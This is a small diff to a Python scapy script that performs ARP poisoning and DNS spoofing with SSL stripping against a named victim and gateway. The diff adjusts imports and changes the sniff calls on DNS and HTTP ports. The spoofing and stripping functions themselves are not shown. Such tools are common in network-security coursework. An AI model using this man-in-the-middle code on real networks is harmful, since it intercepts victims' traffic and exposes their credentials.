@@ -2,8 +2,8 @@ import sys
 import time
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSRR
-from scapy.layers.http import HTTP, HTTPRequest, TCP, Raw
-from scapy.layers.inet import IP, UDP
+# from scapy.layers.http import HTTP, HTTPRequest, TCP, Raw
+from scapy.layers.inet import IP, UDP, TCP, Raw
 from scapy.layers.l2 import Ether, ARP
 
 def getOwnMacIP(iface):
@@ -61,8 +61,8 @@ def attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, 
                 time.sleep(2)
         else:
             print("Initialised DNS Spoofing with SSL Stripping...")
-            sniff(filter="udp port 53", prn=dnsSpoof, iface=iface, store=0)
-            sniff(filter="tcp port 80", prn=sslStrip, iface=iface, store=0)
+            sniff(filter="udp port 53", prn=dnsSpoof, iface=iface)
+            sniff(filter="tcp port 80", prn=sslStrip, iface=iface)
     except KeyboardInterrupt:
         print("Stopped ARP Poisoning" if type_attack == 0 else "Stopped DNS Spoofing with SSL Stripping")
 
